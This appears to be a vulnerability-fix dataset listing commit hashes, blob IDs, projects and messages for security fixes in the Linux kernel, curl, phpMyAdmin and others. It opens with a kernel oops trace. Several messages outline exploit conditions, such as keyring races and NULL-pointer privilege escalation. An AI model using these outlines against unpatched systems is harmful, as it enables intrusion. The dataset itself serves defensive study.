RDX: 0000000000010000 RSI: ffff88001fa99b20 RDI: 00000000000001c8 [   56.283512] RBP: ffff88001fa99b20 R08: 0000000000000000 R09: 0000000000000000 [   56.283512] R10: 0000000000000000 R11: ffffffff812fcb4c R12: ffff88001ddf53c0 [   56.283512] R13: 0000000000000000 R14: 00000000000001c8 R15: ffff88001e19b9f4 [   56.283512] FS:  0000000000000000(0000) GS:ffff88001fd00000(0000) knlGS:0000000000000000 [   56.283512] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [   56.283512] CR2: 00000000000001c8 CR3: 000000001dc51000 CR4: 00000000000006e0 [   56.283512] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [   56.283512] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 [   56.283512] Process khubd (pid: 25, threadinfo ffff88001fa98000, task ffff88001fa94f80) [   56.283512] Stack: [   56.283512]  0000000000000046 00000000000001c8 ffffffff810578ec ffffffff812fcb4c [   56.283512]  ffff88001e19b980 0000000000002710 ffffffff812ffe81 0000000000000001 [   56.283512]  ffff88001fa94f80 0000000000000202 ffffffff00000001 0000000000000296 [   56.283512] Call Trace: [   56.283512]  [<ffffffff810578ec>] ? add_wait_queue+0x12/0x3c [   56.283512]  [<ffffffff812fcb4c>] ? usb_serial_port_work+0x28/0x28 [   56.283512]  [<ffffffff812ffe81>] ? chase_port+0x84/0x2d6 [   56.283512]  [<ffffffff81063f27>] ? try_to_wake_up+0x199/0x199 [   56.283512]  [<ffffffff81263a5c>] ? tty_ldisc_hangup+0x222/0x298 [   56.283512]  [<ffffffff81300171>] ? edge_close+0x64/0x129 [   56.283512]  [<ffffffff810612f7>] ? __wake_up+0x35/0x46 [   56.283512]  [<ffffffff8106135b>] ? should_resched+0x5/0x23 [   56.283512]  [<ffffffff81264916>] ? tty_port_shutdown+0x39/0x44 [   56.283512]  [<ffffffff812fcb4c>] ? usb_serial_port_work+0x28/0x28 [   56.283512]  [<ffffffff8125d38c>] ? __tty_hangup+0x307/0x351 [   56.283512]  [<ffffffff812e6ddc>] ? usb_hcd_flush_endpoint+0xde/0xed [   56.283512]  [<ffffffff8144e625>] ? _raw_spin_lock_irqsave+0x14/0x35 [   56.283512]  [<ffffffff812fd361>] ? usb_serial_disconnect+0x57/0xc2 [   56.283512]  [<ffffffff812ea99b>] ? usb_unbind_interface+0x5c/0x131 [   56.283512]  [<ffffffff8128d738>] ? __device_release_driver+0x7f/0xd5 [   56.283512]  [<ffffffff8128d9cd>] ? device_release_driver+0x1a/0x25 [   56.283512]  [<ffffffff8128d393>] ? bus_remove_device+0xd2/0xe7 [   56.283512]  [<ffffffff8128b7a3>] ? device_del+0x119/0x167 [   56.283512]  [<ffffffff812e8d9d>] ? usb_disable_device+0x6a/0x180 [   56.283512]  [<ffffffff812e2ae0>] ? usb_disconnect+0x81/0xe6 [   56.283512]  [<ffffffff812e4435>] ? hub_thread+0x577/0xe82 [   56.283512]  [<ffffffff8144daa7>] ? __schedule+0x490/0x4be [   56.283512]  [<ffffffff8105798f>] ? abort_exclusive_wait+0x79/0x79 [   56.283512]  [<ffffffff812e3ebe>] ? usb_remote_wakeup+0x2f/0x2f [   56.283512]  [<ffffffff812e3ebe>] ? usb_remote_wakeup+0x2f/0x2f [   56.283512]  [<ffffffff810570b4>] ? kthread+0x81/0x89 [   56.283512]  [<ffffffff81057033>] ? __kthread_parkme+0x5c/0x5c [   56.283512]  [<ffffffff8145387c>] ? ret_from_fork+0x7c/0xb0 [   56.283512]  [<ffffffff81057033>] ? __kthread_parkme+0x5c/0x5c [   56.283512] Code: 8b 7c 24 08 e8 17 0b c3 ff 48 8b 04 24 48 83 c4 10 c3 53 48 89 fb 41 50 e8 e0 0a c3 ff 48 89 04 24 e8 e7 0a c3 ff ba 00 00 01 00 <f0> 0f c1 13 48 8b 04 24 89 d1 c1 ea 10 66 39 d1 74 07 f3 90 66 [   56.283512] RIP  [<ffffffff8144e62a>] _raw_spin_lock_irqsave+0x19/0x35 [   56.283512]  RSP <ffff88001fa99ab0> [   56.283512] CR2: 00000000000001c8 [   56.283512] ---[ end trace 49714df27e1679ce ]---\n\nSigned-off-by: Wolfgang Frisch <wfpub@roembden.net> Cc: Johan Hovold <jhovold@gmail.com> Cc: stable <stable@vger.kernel.org> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    0da9dfdd2cd9889201bc6f6f43580c99165cd087
File(s) In Commit: 
    security/keys/process_keys.c
Blob(s) In Commit: 
    42defae1e161632e93b13b8194af1a30a09f2492
Blob(s) Before Fix: 
    077ab8ca1a6f538aaf3dcb89777f79df851bd558
    0cf8a130a267ca58fbc5599787c93b9913cfc576
    1068cb1939b3122ca857b042ac0df9d304cda6a7
    1b988ccde8e336a41de986125cf76cf773a37fb3
    1c963ff89681e31d78a84ffcd0fffbdc8105632e
    1d5da8e86b6ca9258815b28cec431311f0a455fd
    20cc9d352edc21d8b4cd1e6cb2c1c0e2d7b7c19c
    20e4bf57aec8b6418bf4d4df86c616903121c28c
    27c73780acb777708d9aff14dd90ec73f1ef05a6
    28380e5ba0864b824de4b74a72f458682d183f45
    2eb0e471cd40817a4ae548188dd82be73cbaca71
    43b4cddbf2b39ebd838e3849a1e59e9c7c22c945
    445b46f1abde31ec55fd75166b7f02fbdad67d19
    44a510093f2b877acc3292e02b88eb83b6731edb
    4ad54eea1ea45554d5d931497671fdb32a33660b
    54339cfd6734d46927e8e9228019891e7130c272
    58dfe089094793030f56fdb895f6621e403e4157
    60d0df722dd622e494dd48779c9cbd07c8d40157
    6b8e4ff4cc68cfebe2bb845dda44d8d4b8542635
    7a0c5868651f35780b5f5c4632acc2f6a6bb8896
    854cc3445d3908a640c8b608048ec8435d905c00
    a3063eb3dc232a16eab45161e28f0c88fc642841
    a571fad91010156aa7c532836b2a612e8e82e6fd
    a58f712605d83105b6d32e1b966436a454331a90
    adbfddd7e00b65e296832776fba8d8cb2daa308b
    b6f86808475a0aedfb28e9d677fda7db553f006b
    bd536cb221e237c6cab654b4d4d927daf3f27340
    be7ecb2018dddd2190a606c0954b794a1317c28e
    c5ec0831252a8501fbdb1a581136fb8615e32efd
    cd871dc8b7c0df40284abf2a1ee902698adddcdc
    f58a5aa05fa4594f60c6b7a0806363786a8ec154
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0da9dfdd2cd9889201bc6f6f43580c99165cd087:
keys: fix race with concurrent install_user_keyrings()\n\nThis fixes CVE-2013-1792.\n\nThere is a race in install_user_keyrings() that can cause a NULL pointer dereference when called concurrently for the same user if the uid and uid-session keyrings are not yet created.  It might be possible for an unprivileged user to trigger this by calling keyctl() from userspace in parallel immediately after logging in.\n\nAssume that we have two threads both executing lookup_user_key(), both looking for KEY_SPEC_USER_SESSION_KEYRING.\n\n	THREAD A			THREAD B 	===============================	=============================== 					==>call install_user_keyrings()  	if (!cred->user->session_keyring) 	==>call install_user_keyrings() 					... 					user->uid_keyring = uid_keyring  	if (user->uid_keyring) 		return 0  	<== 	key = cred->user->session_keyring [== NULL] 					user->session_keyring = session_keyring  	atomic_inc(&key->usage)  [oops]\n\nAt the point thread A dereferences cred->user->session_keyring, thread B hasn't updated user->session_keyring yet, but thread A assumes it is populated because install_user_keyrings() returned ok.\n\nThe race window is really small but can be exploited if, for example, thread B is interrupted or preempted after initializing uid_keyring, but before doing setting session_keyring.\n\nThis couldn't be reproduced on a stock kernel.  However, after placing systemtap probe on 'user->session_keyring = session_keyring ' that introduced some delay, the kernel could be crashed reliably.\n\nFix this by checking both pointers before deciding whether to return. Alternatively, the test could be done away with entirely as it is checked inside the mutex - but since the mutex is global, that may not be the best way.\n\nSigned-off-by: David Howells <dhowells@redhat.com> Reported-by: Mateusz Guzik <mguzik@redhat.com> Cc: <stable@kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    c300aa64ddf57d9c5d9c898a64b36877345dd4a9
File(s) In Commit: 
    arch/x86/kvm/x86.c
Blob(s) In Commit: 
    2ade60c254020c2f99fda1c6d35f2118d50a15da
Blob(s) Before Fix: 
    f7c850b36910154cf453dc4b91b2857454d0acdc
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c300aa64ddf57d9c5d9c898a64b36877345dd4a9:
KVM: x86: fix for buffer overflow in handling of MSR_KVM_SYSTEM_TIME (CVE-2013-1796)\n\nIf the guest sets the GPA of the time_page so that the request to update the time straddles a page then KVM will write onto an incorrect page.  The write is done byusing kmap atomic to get a pointer to the page for the time structure and then performing a memcpy to that page starting at an offset that the guest controls.  Well behaved guests always provide a 32-byte aligned address, however a malicious guest could use this to corrupt host kernel memory.\n\nTested: Tested against kvmclock unit test.\n\nSigned-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>

======================================================================
Commit With Fix: 
    a2c118bfab8bc6b8bb213abfc35201e441693d55
File(s) In Commit: 
    virt/kvm/ioapic.c
Blob(s) In Commit: 
    5ba005c00e2f76998694d202eca68452600ee5bf
Blob(s) Before Fix: 
    26fd54dc459ec8900d83da38c9132878ee60780d
    3500dee9cf2b24e7a6965f67d198d6e290798f9e
    3eed61eb48675a63dd1f31b0095217ab6bc5f646
    52058f0defb4a842ef3a24cc9220b52e017ecdbc
    ce82b940195843827be4d22e710942b0683a4618
    cfb7e4d52dc26d1c832eb2a554d8a8ed1d9d23c3
    dcaf272c26c0e232d01b265e652488642e7cc496
    ef61d529a6c48b033cdca2dd249a3dbe8c6356ec
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a2c118bfab8bc6b8bb213abfc35201e441693d55:
KVM: Fix bounds checking in ioapic indirect register reads (CVE-2013-1798)\n\nIf the guest specifies a IOAPIC_REG_SELECT with an invalid value and follows that with a read of the IOAPIC_REG_WINDOW KVM does not properly validate that request.  ioapic_read_indirect contains an ASSERT(redir_index < IOAPIC_NUM_PINS), but the ASSERT has no effect in non-debug builds.  In recent kernels this allows a guest to cause a kernel oops by reading invalid memory.  In older kernels (pre-3.3) this allows a guest to read from large ranges of host memory.\n\nTested: tested against apic unit tests.\n\nSigned-off-by: Andrew Honig <ahonig@google.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>

======================================================================
Commit With Fix: 
    a0e02933f5f7ce5f364fbad36a005f0a349f0696
File(s) In Commit: 
    ZeroClipboard.as
Blob(s) In Commit: 
    d973b18cb31516a5489758d16d7551940193c39a
Blob(s) Before Fix: 
    26ad18b55738cb6cbf8e162d9c9423a73cf59dc2
Projects:
    0b10011_zeroclipboard
Commit Message for a0e02933f5f7ce5f364fbad36a005f0a349f0696:
escape fix becuse XSS risk like

======================================================================
Commit With Fix: 
    eb178619f930fa2ba2348de332a1ff1c66a31424
File(s) In Commit: 
    fs/xfs/xfs_buf.c
Blob(s) In Commit: 
    689d72655ea62183775946607096e75bf56d73bc
Blob(s) Before Fix: 
    56d1614760cfba8b58957f37146d417d120fc087
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for eb178619f930fa2ba2348de332a1ff1c66a31424:
xfs: fix _xfs_buf_find oops on blocks beyond the filesystem end\n\nWhen _xfs_buf_find is passed an out of range address, it will fail to find a relevant struct xfs_perag and oops with a null dereference. This can happen when trying to walk a filesystem with a metadata inode that has a partially corrupted extent map (i.e. the block number returned is corrupt, but is otherwise intact) and we try to read from the corrupted block address.\n\nIn this case, just fail the lookup. If it is readahead being issued, it will simply not be done, but if it is real read that fails we will get an error being reported.  Ideally this case should result in an EFSCORRUPTED error being reported, but we cannot return an error through xfs_buf_read() or xfs_buf_get() so this lookup failure may result in ENOMEM or EIO errors being reported instead.\n\nSigned-off-by: Dave Chinner <dchinner@redhat.com> Reviewed-by: Brian Foster <bfoster@redhat.com> Reviewed-by: Ben Myers <bpm@sgi.com> Signed-off-by: Ben Myers <bpm@sgi.com>

======================================================================
Commit With Fix: 
    864745d291b5ba80ea0bd0edcbe67273de368836
File(s) In Commit: 
    net/xfrm/xfrm_user.c
Blob(s) In Commit: 
    dac08e2a5a93e69648e3210b59a333d8c62195fb
Blob(s) Before Fix: 
    e75d8e47f35cab2bdddd1051e6da556ef20eb26c
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 864745d291b5ba80ea0bd0edcbe67273de368836:
xfrm_user: return error pointer instead of NULL\n\nWhen dump_one_state() returns an error, e.g. because of a too small buffer to dump the whole xfrm state, xfrm_state_netlink() returns NULL instead of an error pointer. But its callers expect an error pointer and therefore continue to operate on a NULL skbuff.\n\nThis could lead to a privilege escalation (execution of user code in kernel context) if the attacker has CAP_NET_ADMIN and is able to map address 0.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Steffen Klassert <steffen.klassert@secunet.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    276bdb82dedb290511467a5a4fdbe9f0b52dce6f
File(s) In Commit: 
    net/dccp/ccid.h
Blob(s) In Commit: 
    fb85d371a8dec875a01205b22ef6ddef5e99d511
Blob(s) Before Fix: 
    1ff6115c5719a37db89baef4c6a05549c63a67d3
    6df6f8ac963664e2174b55c890ce7f45cbe05128
    6eb837a47b5c42f8c73c498525fe4d269fc5b97d
    73ac3c5a7d9f8ad63bcec2b0399b754053da8159
    75c3582a7678ab418771b2a5ad5fd3c069a9e512
    ab260b0c6b07883d74faa6622fb8bb75383d585b
    c65cb2453e43d7836e80ab25059d3993c5d875ce
    db021236aaf82f31cad3fc955a447a7c3326ac41
    facedd20b531a0ce42fb03f5afccef290f11f7bc
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 276bdb82dedb290511467a5a4fdbe9f0b52dce6f:
dccp: check ccid before dereferencing\n\nccid_hc_rx_getsockopt() and ccid_hc_tx_getsockopt() might be called with a NULL ccid pointer leading to a NULL pointer dereference. This could lead to a privilege escalation if the attacker is able to map page 0 and prepare it with a fake ccid_ops pointer.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Cc: Gerrit Renker <gerrit@erg.abdn.ac.uk> Cc: stable@vger.kernel.org Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    726bc6b092da4c093eb74d13c07184b18c1af0f1
File(s) In Commit: 
    net/sctp/socket.c
Blob(s) In Commit: 
    9ef5c7312e12c36c4a194acf507ff0962356567a
Blob(s) Before Fix: 
    4434853a9fe763994b32fc452511355e673cd7f8
    59d16ea927f0f83d706d3a59c79d13be0a95c1e8
    5e259817a7f34cd4a183139fe9c4bf5ee2ab6689
    8e49d76ff3b2e805cf611f675f9945c875e41b56
    92ba71dfe080125b58bc01cd40e7a2d158c9ab61
    9e65758cb03814f9372eafbf86c4821af124be00
    a60d1f8b41c5e2330e837265e175202aba322fcb
    b1917f68723cd1ce90cb801672d66001c7c45a9d
    b70a3ee6016c20bc26a46f202a4b84e8909bc765
    cedd9bf67b8c5942aa0cbf5441342be62abd5e69
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 726bc6b092da4c093eb74d13c07184b18c1af0f1:
net/sctp: Validate parameter size for SCTP_GET_ASSOC_STATS\n\nBuilding sctp may fail with:\n\nIn function ‘copy_from_user’,     inlined from ‘sctp_getsockopt_assoc_stats’ at     net/sctp/socket.c:5656:20: arch/x86/include/asm/uaccess_32.h:211:26: error: call to     ‘copy_from_user_overflow’ declared with attribute error: copy_from_user()     buffer size is not provably correct\n\nif built with W=1 due to a missing parameter size validation before the call to copy_from_user.\n\nSigned-off-by: Guenter Roeck <linux@roeck-us.net> Acked-by: Vlad Yasevich <vyasevich@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    8d0c2d10dd72c5292eda7a06231056a4c972e4cc
File(s) In Commit: 
    fs/ext3/super.c
Blob(s) In Commit: 
    fb5120a5505c055b9de9e7b948713256329cf690
Blob(s) Before Fix: 
    0a7f2d0b8b192dc598cd1ee8c3c6bb0d001b7cc7
    1d6e2ed853229edfebb4de3a51fff8e86846e1ae
    29e79713c7eb6ccd37eac31c20c02fb5fd826744
    4ba2683c1d44f0181bc514c155c723c27012d635
    5366393528dfbd622120549729cf22a891026f44
    5546ca225ffe19ee3e53d75ee4e18936fa47cc83
    6c953bb255e760d4109cb35871a42827f69c4a77
    6e50223b3299fcc8628115a6984bc6c9d6160f13
    8c3a44b7c375247f54ac0d0e61be3be99e0b1d6a
    8c892e93d8e7b6f2ff727709619eedde0e880812
    922d289aeeb315ce4a5c1131371ea90f266c0df4
    cf0b5921cf0fc5f9045394f8e847505153dfe3f4
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 8d0c2d10dd72c5292eda7a06231056a4c972e4cc:
ext3: Fix format string issues\n\next3_msg() takes the printk prefix as the second parameter and the format string as the third parameter. Two callers of ext3_msg omit the prefix and pass the format string as the second parameter and the first parameter to the format string as the third parameter. In both cases this string comes from an arbitrary source. Which means the string may contain format string characters, which will lead to undefined and potentially harmful behavior.\n\nThe issue was introduced in commit 4cf46b67eb("ext3: Unify log messages in ext3") and is fixed by this patch.\n\nCC: stable@vger.kernel.org Signed-off-by: Lars-Peter Clausen <lars@metafoo.de> Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    c0f5ecee4e741667b2493c742b60b6218d40b3aa
File(s) In Commit: 
    drivers/usb/class/cdc-wdm.c
Blob(s) In Commit: 
    122d056d96d570c2d59762fda22e0e973ac081b5
Blob(s) Before Fix: 
    00b7bf9a20cea745575e8cc1533ccfb563b207cb
    094c76b5de17114e83a886b872ec4e58579220da
    0bb2b3248dad99b0e114b83dc1028edd5fadb4a1
    1c50baff7725ec2d8e368b3c34f50925a76f3804
    5f0cb417b736bb4b61c73afc52672029af59cbda
    61ea87917433096a73cb2bc3ef7f3f3a857e5caa
    8a72e054fd10a68aa3a14ddaa950b158ccd6ef7e
    9aaed0d70a41b31e3086dfe376d63db3531ce694
    ee469274a3fe0d03aed9259f5f4c380330742aa3
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c0f5ecee4e741667b2493c742b60b6218d40b3aa:
USB: cdc-wdm: fix buffer overflow\n\nThe buffer for responses must not overflow. If this would happen, set a flag, drop the data and return an error after user space has read all remaining data.\n\nSigned-off-by: Oliver Neukum <oliver@neukum.org> CC: stable@kernel.org Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    12176503366885edd542389eed3aaf94be163fdb
File(s) In Commit: 
    fs/compat_ioctl.c
Blob(s) In Commit: 
    4c6285fff598e1faf9bb471f8b3b5593db74b355
Blob(s) Before Fix: 
    51352de88ef10ea41583661f39625f93b475aa34
    59f8db4a39a78338b2c7a148122a04e11e026caf
    5d2069ff635cdb3ad1d1e691b9a6d11dc4b03dac
    a26bea10e81bae5c9ee1890102ce86b7929bde28
    debdfe0fc809edfd01ac4a72a0eaf2753efc993d
    edd4ab67cd1b722e5f0dd7439d3a396bee9b91e9
    f5054025f9da7c154b067db092cc44f8b953f835
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 12176503366885edd542389eed3aaf94be163fdb:
fs/compat_ioctl.c: VIDEO_SET_SPU_PALETTE missing error check\n\nThe compat ioctl for VIDEO_SET_SPU_PALETTE was missing an error check while converting ioctl arguments.  This could lead to leaking kernel stack contents into userspace.\n\nPatch extracted from existing fix in grsecurity.\n\nSigned-off-by: Kees Cook <keescook@chromium.org> Cc: David Miller <davem@davemloft.net> Cc: Brad Spengler <spender@grsecurity.net> Cc: PaX Team <pageexec@freemail.hu> Cc: <stable@vger.kernel.org> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    715230a44310a8cf66fbfb5a46f9a62a9b2de424
File(s) In Commit: 
    drivers/net/ethernet/broadcom/tg3.c
Blob(s) In Commit: 
    17a972734ba746d9218df4bf025218a91ebee947
Blob(s) Before Fix: 
    67d2663b3974aeaf03acfeb9500704ee5659ab8a
    6917998ba0ec4748cf3bd0dee2754f62ad16ee33
    78ea90c40e1902af09272a80b09010da52ae6c6b
    8a5253c1d764040cb169dd1789c1a2f028fbb5dd
    93729f9423588de05fa4d5e25dbcef99438fd17d
    a8800ac10df970b280690272f8618247f80d0823
    bdb086934cd95de72cd1aa02cf1cb4b6baaaafc3
    bf906c51d82a4085fd0167d826cdd3bcd497b2df
    e47ff8be1d7b5c27be543c7d41f4584d56054644
    fdb9b5655414e77dc6506cdda13642ef16115e27
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 715230a44310a8cf66fbfb5a46f9a62a9b2de424:
tg3: fix length overflow in VPD firmware parsing\n\nCommit 184b89044fb6e2a74611dafa69b1dce0d98612c6 ("tg3: Use VPD fw version when present") introduced VPD parsing that contained a potential length overflow.\n\nLimit the hardware's reported firmware string length (max 255 bytes) to stay inside the driver's firmware string length (32 bytes). On overflow, truncate the formatted firmware string instead of potentially overwriting portions of the tg3 struct.\n\nhttp://cansecwest.com/slides/2013/PrivateCore%20CSW%202013.pdf\n\nSigned-off-by: Kees Cook <keescook@chromium.org> Reported-by: Oded Horovitz <oded@privatecore.com> Reported-by: Brad Spengler <spender@grsecurity.net> Cc: stable@vger.kernel.org Cc: Matt Carlson <mcarlson@broadcom.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    79089c9bc02c82c15419fd9d6496b8781ae08a5a
File(s) In Commit: 
    tbl_gis_visualization.php
Blob(s) In Commit: 
    bd95b2e6c71438e1d10fafe43c3fe43468a2571e
Blob(s) Before Fix: 
    0811d01aebcbfd0887d0aaf2cf95f7c9f6149467
Projects:
    007durgesh219_phpmyadmin
Commit Message for 79089c9bc02c82c15419fd9d6496b8781ae08a5a:
fix XSS reported by Janek Vind

======================================================================
Commit With Fix: 
    2eb8dcf26cb37f09cffe26909a646e702dbcab66
File(s) In Commit: 
    lib/cookie.c
Blob(s) In Commit: 
    a67204e6e27dc553c146fa1d4ad640c9c8e0fe7e
Blob(s) Before Fix: 
    097258dd1213095535454c5a10f106859f2f47f7
    18b91559ca07f505998f8873f0b855a8b2a422bf
    41ccdbe34109f44a082e9f3c7cd0cdc5ad597cbb
    4b9ec0bdd9aa74ca0b32299993588bb61dc708a6
    b6790677fdbf41dee9957234c3e4c7091e05e2b6
Projects:
    0ca_curl
Commit Message for 2eb8dcf26cb37f09cffe26909a646e702dbcab66:
cookie: fix tailmatching to prevent cross-domain leakage\n\nCookies set for 'example.com' could accidentaly also be sent by libcurl to the 'bexample.com' (ie with a prefix to the first domain name).\n\nThis is a security vulnerabilty, CVE-2013-1944.\n\nBug: http://curl.haxx.se/docs/adv_20130412.html

======================================================================
Commit With Fix: 
    92f28d973cce45ef5823209aab3138eb45d8b349
File(s) In Commit: 
    net/core/scm.c
Blob(s) In Commit: 
    2dc6cdaaae8abc5f31afa57a7ccf765cc978b6ac
Blob(s) Before Fix: 
    040cebeed45b810cf9dd7d85c6ac2cbade98ee77
    292ad8d5ad76262c46fc33248376cd0401658722
    57fb1ee6649f65a0994d86c6f8763fe6e14ba081
    611c5efd4cb0b71abeb9b3d965acbf490673e644
    811b53fb330e8a40e640db483965acfc8c55cc4a
    905dcc6ad1e3b480c01f87df5157f4e37de112a1
    ab570841a532ea318b5133596f1957192ff01354
    ff52ad0a51501c98891401d6e29f18dfab80ade9
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 92f28d973cce45ef5823209aab3138eb45d8b349:
scm: Require CAP_SYS_ADMIN over the current pidns to spoof pids.\n\nDon't allow spoofing pids over unix domain sockets in the corner cases where a user has created a user namespace but has not yet created a pid namespace.\n\nCc: stable@vger.kernel.org Reported-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: "Eric W. Biederman" <ebiederm@xmission.com>

======================================================================
Commit With Fix: 
    9223dc6bfc50251a9a3cba0210e71be80fc38ecd
File(s) In Commit: 
    README.md
Blob(s) In Commit: 
    bb8bc808f82305571b16e464160f8463780f45ba
Blob(s) Before Fix: 
    eab962a88128148f3a32093a47fa6cefd93f9158
Projects:
    0NtgO_mediaelement
Commit Message for 9223dc6bfc50251a9a3cba0210e71be80fc38ecd:
2.11.1 updates

======================================================================
Commit With Fix: 
    83f1b4ba917db5dc5a061a44b3403ddb6e783494
File(s) In Commit: 
    include/net/scm.h
Blob(s) In Commit: 
    b11708105681e04f5c24f7ed206f732e2c37dc02
Blob(s) Before Fix: 
    0c0017ce23bb60d3aa798a4afce2719dfaea5b08
    745460fa2f02cdd96e6b6befd79b8791d95965fd
    7dc0854f0b3891992696002b7f75edf7a01233ab
    820c1b365cba68b3cd109d44501cbd4c4a7bc15f
    975cca01048bee3b7da9017725654053921250ae
    d456f4c71a323b18b4bcbf24ca59a5bc96b8243a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 83f1b4ba917db5dc5a061a44b3403ddb6e783494:
net: fix incorrect credentials passing\n\nCommit 257b5358b32f ("scm: Capture the full credentials of the scm sender") changed the credentials passing code to pass in the effective uid/gid instead of the real uid/gid.\n\nObviously this doesn't matter most of the time (since normally they are the same), but it results in differences for suid binaries when the wrong uid/gid ends up being used.\n\nThis just undoes that (presumably unintentional) part of the commit.\n\nReported-by: Andy Lutomirski <luto@amacapital.net> Cc: Eric W. Biederman <ebiederm@xmission.com> Cc: Serge E. Hallyn <serge@hallyn.com> Cc: David S. Miller <davem@davemloft.net> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Acked-by: "Eric W. Biederman" <ebiederm@xmission.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c5037dd6b82909efaaa8720e8cfa8bdb8b4a0edd
File(s) In Commit: 
    keystone/common/config.py
Blob(s) In Commit: 
    82c31e6d62048f14a2437566c50a3af54a384719
Blob(s) Before Fix: 
    bcfc347ccf0d06de45e77948b4f98e2ea4a13168
    edecee05de1470a868cc3e720181349f001c0ecc
Projects:
    08_keystone
Commit Message for c5037dd6b82909efaaa8720e8cfa8bdb8b4a0edd:
Mark LDAP password and admin_token secret\n\nAdd secret=True to LDAP password and admin_token of keystone configuration.\n\nFix bug #1172195\n\nChange-Id: I8ef7f705e3f6b374ff427c20eb761892d5146a75 (cherry picked from commit d43e2a51a1ed7adbed3c5ddf001d46bc4a824ae8)

======================================================================
Commit With Fix: 
    0e9a9a1ad619e7e987815d20262d36a2f95717ca
File(s) In Commit: 
    fs/ext4/namei.c
Blob(s) In Commit: 
    8990165346ee6aa01a7f9a3264a092fc9669e85b
Blob(s) Before Fix: 
    2a42cc04466f6858f55fea7e4a8beb2f1232319f
    349d7b3671c863ce1565a5d2a184c6bbdafbf6e3
    6d600a69fc9dedcfa92b45064cfcb85e79260946
    cac44828233159bfeb1d93c502943fe82b813b2a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0e9a9a1ad619e7e987815d20262d36a2f95717ca:
ext4: avoid hang when mounting non-journal filesystems with orphan list\n\nWhen trying to mount a file system which does not contain a journal, but which does have a orphan list containing an inode which needs to be truncated, the mount call with hang forever in ext4_orphan_cleanup() because ext4_orphan_del() will return immediately without removing the inode from the orphan list, leading to an uninterruptible loop in kernel code which will busy out one of the CPU's on the system.\n\nThis can be trivially reproduced by trying to mount the file system found in tests/f_orphan_extents_inode/image.gz from the e2fsprogs source tree.  If a malicious user were to put this on a USB stick, and mount it on a Linux desktop which has automatic mounts enabled, this could be considered a potential denial of service attack.  (Not a big deal in practice, but professional paranoids worry about such things, and have even been known to allocate CVE numbers for such problems.)\n\nSigned-off-by: "Theodore Ts'o" <tytso@mit.edu> Reviewed-by: Zheng Liu <wenqing.lz@taobao.com> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    24ff855c82d3f5c62bc5788a5776cefbffce2971
File(s) In Commit: 
    libclamav/pdf.c
Blob(s) In Commit: 
    121fa01b4d091022e78d0e6421f65f5750407982
Blob(s) Before Fix: 
    6268159125c1bdab9f04b5eba42f78ade47f532c
Projects:
    0ca_clamav-devel
Commit Message for 24ff855c82d3f5c62bc5788a5776cefbffce2971:
pdf: bb #7053

======================================================================
Commit With Fix: 
    92c266170ce98edc200c656bd034a237098b8aa5
File(s) In Commit: 
    hawtjni-runtime/src/main/java/org/fusesource/hawtjni/runtime/Library.java
Blob(s) In Commit: 
    422bd2fc248fc5167fd72b1e9d05e77a82bccb4a
Blob(s) Before Fix: 
    28e15ea9e41204d1bf73449707628e7a61a4d0ae
    c23081de97a8276a18c54bfb17cd460a99d0da04
Projects:
    JianpingZeng_hawtjni
Commit Message for 92c266170ce98edc200c656bd034a237098b8aa5:
Simplify shared lib extraction.

======================================================================
Commit With Fix: 
    929473ea05db455ad88cdc081f2adc556b8dc48f
File(s) In Commit: 
    drivers/usb/chipidea/host.c
Blob(s) In Commit: 
    8e9d31277c436ecce3fdd61ccb78031148a3e53e
Blob(s) Before Fix: 
    18cb8e46262d3ed3492d1045b7e15b9b4496f479
    21fe1a31431356d5056d4c443eb982a15ff25534
    3d24304405b36f358a56d7a8dc6a881804b62df9
    40d0fda4f66c8f696b0d935fa464ce3632c09020
    526cd77563d8a89c29f5444901ee3ba366b1575a
    7c212f5b7e0e3dff81335d772138da4d9dc5037d
    829c046023b8d7113d8343fa3d135c413753d173
    9eacd21c0cd9ffd9fe7d98ac89f0cd75e79b6b31
    a8ac6c16dac92832f79cd4d978f5af85b70b94dd
